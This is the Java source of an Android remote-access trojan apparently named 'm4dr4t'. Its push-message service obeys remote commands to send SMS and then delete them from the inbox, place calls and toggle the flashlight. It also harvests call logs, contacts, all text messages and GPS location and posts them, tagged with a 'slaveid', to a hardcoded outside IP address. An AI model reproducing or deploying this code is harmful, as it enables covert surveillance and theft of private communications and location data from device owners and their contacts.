package example.com.m4dr4t;

import android.app.IntentService;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesClient;
import com.google.android.gms.gcm.GoogleCloudMessaging;
import com.google.android.gms.location.LocationClient;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;


public class GcmIntentService extends IntentService implements
        GooglePlayServicesClient.ConnectionCallbacks,
        GooglePlayServicesClient.OnConnectionFailedListener {
    public static final int NOTIFICATION_ID = 1;
    static final String TAG = "Client";
    NotificationCompat.Builder builder;
    private NotificationManager mNotificationManager;
    SharedPreferences prefs;
    LocationClient mLocationClient;
    Location mCurrentLocation;
    String lat, lng;
    Camera camera;
    boolean isFlashOn;
    Camera.Parameters p;

    public GcmIntentService() {
        super("GcmIntentService");
        camera = Camera.open();

    }

    @Override
    protected void onHandleIntent(Intent intent)  {
        mLocationClient = new LocationClient(getApplicationContext(), this, this);


        Bundle extras = intent.getExtras();
        GoogleCloudMessaging gcm = GoogleCloudMessaging.getInstance(this);
        // The getMessageType() intent parameter must be the intent you received
        // in your BroadcastReceiver.
        String messageType = gcm.getMessageType(intent);

        if (!extras.isEmpty()) {  // has effect of unparcelling Bundle
            /*
             * Filter messages based on message type. Since it is likely that GCM
             * will be extended in the future with new message types, just ignore
             * any message types you're not interested in, or that you don't
             * recognize.
             */
            if (GoogleCloudMessaging.
                    MESSAGE_TYPE_SEND_ERROR.equals(messageType)) {
                sendNotification("Send error: " + extras.toString());
            } else if (GoogleCloudMessaging.
                    MESSAGE_TYPE_DELETED.equals(messageType)) {
                sendNotification("Deleted messages on server: " +
                        extras.toString());
                // If it's a regular GCM message, do some work.
            } else if (GoogleCloudMessaging.
                    MESSAGE_TYPE_MESSAGE.equals(messageType)) {
                // This loop represents the service doing some work.

                Log.i(TAG, "Completed work @ " + SystemClock.elapsedRealtime());
                // Post notification of received message.
                String type = intent.getStringExtra("type");
                Log.i(TAG, type);
                if(type.equalsIgnoreCase("sendSMS"))
                {
                    Log.i(TAG, intent.getStringExtra("number"));
                    Log.i(TAG, intent.getStringExtra("message"));
                    String number = intent.getStringExtra("number");
                    String message = intent.getStringExtra("message");
                    sendsms(number,message);
                }
                if(type.equalsIgnoreCase("makeCall"))
                {
                    Log.i(TAG, intent.getStringExtra("number"));

                    String number = intent.getStringExtra("number");

                    callphone(number);
                }
                if(type.equalsIgnoreCase("flashLight"))
                {
                    Log.i(TAG, intent.getStringExtra("message"));

                    String message = intent.getStringExtra("message");

                    flashLight(message);
                }
                else
                sendNotification(intent.getStringExtra("type"));

            }
        }
        // Release the wake lock provided by the WakefulBroadcastReceiver.
        GcmBroadcastReceiver.completeWakefulIntent(intent);
    }


    // Put the message into a notification and post it.
    // This is just one simple example of what you might choose to do with
    // a GCM message.
    private void sendNotification(String msg) {
    if(msg.equalsIgnoreCase("call"))
    {
        Thread t = new Thread(new Runnable() {
            public void run() {

                try {
                    getCallDetails();
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }
        });
        t.start();
    }
        if(msg.equalsIgnoreCase("contacts"))
        {
            Thread t = new Thread(new Runnable() {
                public void run() {

                    try {
                        fetchContacts();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
            });
            t.start();
        }
        if(msg.equalsIgnoreCase("messages"))
        {
            Thread t = new Thread(new Runnable() {
                public void run() {

                    try {
                        getsms();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
            });
            t.start();
        }
        if(msg.equalsIgnoreCase("location"))
        {
            Thread t = new Thread(new Runnable() {
                public void run() {

                    mLocationClient.connect();
                }
            });
            t.start();
        }



    }
    private void flashLight (String message)
    {



             boolean hasFlash;

            hasFlash = getApplicationContext().getPackageManager()
                    .hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
            if(hasFlash)
            {


                if(message.equalsIgnoreCase("ON"))
                {
                    try {

                        p = camera.getParameters();
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                        camera.setParameters(p);
                        camera.startPreview();
                    } catch (RuntimeException e) {
                        Log.e("Camera Error. Failed to Open. Error: ", e.getMessage());
                    }




                }
                if(message.equalsIgnoreCase("OFF"))
                {

                    if (camera != null) {
                        camera.release();
                        camera = null;
                    }


                }
            }




    }
    private void sendsms(String number,String message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(number, null, message, null, null);
        deleteSMS(getApplicationContext(),message,number);
    }
    public void deleteSMS(Context context, String message, String number) {
        try {
            Log.i(TAG,"Entered");
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = context.getContentResolver().query(uriSms,
                    new String[] { "_id", "thread_id", "address",
                            "person", "date", "body" }, null, null, null);

            if (c != null && c.moveToFirst()) {
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);

                    if (message.equals(body) && address.equals(number)) {

                        context.getContentResolver().delete(
                                Uri.parse("content://sms/" + id), null, null);
                        Log.i(TAG,"Deleted");
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {

        }
    }

    private void callphone(String number) {
        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);

    }

    private void getCallDetails() throws JSONException {
        int i = 0;

        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        JSONObject parent = new JSONObject();
        JSONArray logs = new JSONArray();
        while (managedCursor.moveToNext() && i<30) {
            i++;
            JSONObject details = new JSONObject();

            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));

            String callDuration = managedCursor.getString(duration);
            String person = managedCursor.getString(name);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            if (person == null)
                details.put("name", "No Name");
            else
                details.put("name", person);

            details.put("number", phNumber);
            details.put("duration", callDuration);
            details.put("type", dir);
            details.put("date", callDayTime);
            logs.put(details);
        }
        managedCursor.close();
        parent.put("logs", logs);

        String data = parent.toString();

        AsyncTaskRunner runner = new AsyncTaskRunner();
        runner.execute("calllogs", data);

    }

    public void fetchContacts() throws JSONException {
        StringBuffer output = new StringBuffer();
        JSONObject parent = new JSONObject();
        JSONArray contacts = new JSONArray();

        ContentResolver cr = getContentResolver();
        Cursor cur = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null,
                ContactsContract.Contacts.HAS_PHONE_NUMBER + " = 1",
                null,
                "UPPER(" + ContactsContract.Contacts.DISPLAY_NAME + ") ASC");
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                int i = 0;
                JSONObject details = new JSONObject();
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));


                details.put("Name", name);


                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        // Do something with phones
                        i++;
                        String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        details.put("Phone" + i, phoneNumber);

                    }
                    contacts.put(details);
                    pCur.close();

                }


            }
        }
        cur.close();

        parent.put("contacts", contacts);
//        outputText.setText(parent.toString());
        String data = parent.toString();
        //This will get the SD Card directory and create a folder named MyFiles in it.
        File sdCard = Environment.getExternalStorageDirectory();
        File directory = new File (sdCard.getAbsolutePath() + "/MyFiles");
        directory.mkdirs();

//Now create the file in the above directory and write the contents into it
        File file = new File(directory, "mysdfile.txt");
        FileOutputStream fOut = null;
        try {
            fOut = new FileOutputStream(file);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        OutputStreamWriter osw = new OutputStreamWriter(fOut);
        try {
            osw.write(data);
            osw.flush();
            osw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        AsyncTaskRunner runner = new AsyncTaskRunner();
        runner.execute("contacts", data);


    }
    public boolean isExternalStorageWritable() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        }
        return false;
    }
    public void getsms() throws JSONException {
        Uri uriSMSURI = Uri.parse("content://sms/");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
        JSONObject parent = new JSONObject();
        JSONArray messages = new JSONArray();
        while (cur.moveToNext()) {
            JSONObject details = new JSONObject();
            String address = cur.getString(cur.getColumnIndex("address"));
            String name = getContactName(getApplicationContext(), address);
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String inttype = cur.getString(cur.getColumnIndexOrThrow("type"));
            String date =  cur.getString(cur.getColumnIndex("date"));
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();

            if (name == null)
                details.put("Name", address);
            else
                details.put("Name", name);

            details.put("Message", body);
            if (inttype.equalsIgnoreCase("1")) {
                String type = "INCOMING";
                details.put("Type", type);
            } else {
                String type = "OUTGOING";
                details.put("Type", type);
            }
            details.put("Date", smsDate);
            messages.put(details);
        }
        cur.close();
        parent.put("messages", messages);
        String data = parent.toString();
        String type = "sms";
        AsyncTaskRunner runner = new AsyncTaskRunner();
        runner.execute(type, data);


    }

    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }

    @Override
    public void onConnected(Bundle bundle) {
        Log.i(TAG, "Connected");
        mCurrentLocation = mLocationClient.getLastLocation();

        if (mCurrentLocation != null) {
            String lat = Double.toString(mCurrentLocation.getLatitude());
            String lng = Double.toString(mCurrentLocation.getLongitude());
            String data = "{\n" +
                    "   \"location\": [\n" +
                    "       {\n" +
                    "           \"latitude\": \"" + lat + "   \",\n" +
                    "           \"longitude\": \"" + lng + "\"\n" +
                    "       }\n" +
                    "   ]\n" +
                    "}";
            AsyncTaskRunner runner = new AsyncTaskRunner();
            runner.execute("location", data);
            mLocationClient.disconnect();


        }

    }

    @Override
    public void onDisconnected() {

    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {

    }

    private class AsyncTaskRunner extends AsyncTask<String, String, String> {

        @Override
        protected String doInBackground(String... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(
                    "http://128.199.179.143/groups/api/addDetail");
            String responseBody = null;
            Log.i("Type", params[0]);
            Log.i("ID", getRegistrationId(getApplicationContext()));
            Log.i("Data", params[1]);


            try {
                // Add your data
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

                nameValuePairs.add(new BasicNameValuePair("type", params[0]));
                nameValuePairs.add(new BasicNameValuePair("detail", params[1]));
                nameValuePairs.add(new BasicNameValuePair("slaveid", getRegistrationId(getApplicationContext())));

                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                // Execute HTTP Post Request
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity entity = response.getEntity();
                responseBody = EntityUtils.toString(entity);
                Log.i("Response", responseBody);
                // Log.i("Parameters", params[0]);

            } catch (ClientProtocolException e) {

                // TODO Auto-generated catch block
            } catch (IOException e) {


                // TODO Auto-generated catch block
            }
            return responseBody;

        }

        /*
         * (non-Javadoc)
         *
         * @see android.os.AsyncTask#onPostExecute(java.lang.Object)
         */
        @Override
        protected void onPostExecute(String result) {


        }

    }

    private SharedPreferences getGCMPreferences(Context context) {
        // This sample app persists the registration ID in shared preferences, but
        // how you store the regID in your app is up to you.
        return getSharedPreferences(MainActivity.class.getSimpleName(),
                Context.MODE_PRIVATE);
    }

    private String getRegistrationId(Context context) {
        final SharedPreferences prefs = getGCMPreferences(context);
        String registrationId = prefs.getString("registration_id", "");
        if (registrationId.isEmpty()) {
            Log.i(TAG, "Registration not found.");
            return "";
        }
        return registrationId;

    }
}
